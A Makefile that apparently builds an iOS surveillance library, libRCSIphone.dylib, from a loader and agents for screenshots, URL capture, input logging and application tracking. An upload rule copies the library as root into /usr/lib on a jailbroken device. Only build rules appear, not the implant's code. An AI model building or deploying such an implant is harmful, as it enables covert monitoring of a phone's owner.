DEVICE    = ipony-3g

SDK       = /Developer/Platforms/iPhoneOS.platform/Developer
ARCH      = armv6
#SYSROOT  = $(SDK)/SDKs/iPhoneOS2.1.sdk
SYSROOT   = $(SDK)/SDKs/iPhoneOS3.0.sdk
#SYSROOT   = $(SDK)/SDKs/iPhoneOS3.2.sdk

#CC        = $(SDK)/usr/bin/arm-apple-darwin9-gcc-4.0.1\
#            -arch $(ARCH) -isysroot $(SYSROOT)

CC        = $(SDK)/usr/bin/g++\
            -arch $(ARCH) -isysroot $(SYSROOT)

CFLAGS    = -I$(SDK)/usr/include/gcc/darwin/4.0 -dynamiclib -mthumb-interwork #--Wall

LD        = $(CC)
INCLUDE   = -I../ -I../Modules/ -I../Support/ -I./ -I./Agents/

CORE      = RCSILoader.mm
MODULES   = #../Modules/RCSIEncryption.mm
SUPPORT   = ../Support/RCSISharedMemory.m #ARMHooker.mm
AGENTS    = Agents/RCSIAgentScreenshot.m Agents/RCSIAgentURL.m Agents/RCSIAgentInputLogger.mm Agents/RCSIAgentApplication.m

LDFLAGS=\
        -framework UIKit\
        -framework CoreFoundation\
        -framework Foundation\
        -framework CoreGraphics\
				/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS3.0.sdk/System/Library/PrivateFrameworks/ImageIO.framework/ImageIO\
        -lobjc

target := /Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/

all: libRCSIphone.dylib

clean:
	rm -f libRCSIphone.dylib

libRCSIphone.dylib:
	#$(LD) $(INCLUDE) -c -mthumb -mthumb-interwork ../Support/thumb_override_func.mm
	$(LD) $(LDFLAGS) $(INCLUDE) $(CFLAGS) -o $@ $(filter %.mm,$^) $(CORE) $(MODULES) $(SUPPORT) $(AGENTS) -init _RCSIInit
	cp libRCSIphone.dylib ../build

upload:
	scp libRCSIphone.dylib root@$(DEVICE):/usr/lib/
